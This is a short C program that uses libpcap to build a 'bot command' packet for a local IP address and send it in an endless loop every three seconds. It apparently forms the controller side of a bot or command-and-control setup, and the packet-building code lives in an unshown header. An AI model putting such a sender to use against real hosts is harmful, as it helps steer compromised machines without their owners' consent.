#include <stdio.h>
#include <pcap/pcap.h>
#include "utils.h"
#include <unistd.h>

int main(int argc, char argv[])
{
    pcap_t* handler = pcap_open_live(adapter_id, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, errbuff);

    if(!handler)
    {
        NPCAP_ERROR
        return 1;
    }
    
    u_char package[64];
    u_char ip[4] = {192, 168, 1, 43};
    create_bot_command(ip, 20, package);

    while(true)
    {
        pcap_sendpacket(handler, package, 64);
        printf("sending command:\n");
        for(int i=0; i<64; i++)
            printf("%x ", package[i]);
        printf("\n\n");
        sleep(3);
    }

    return 0;
}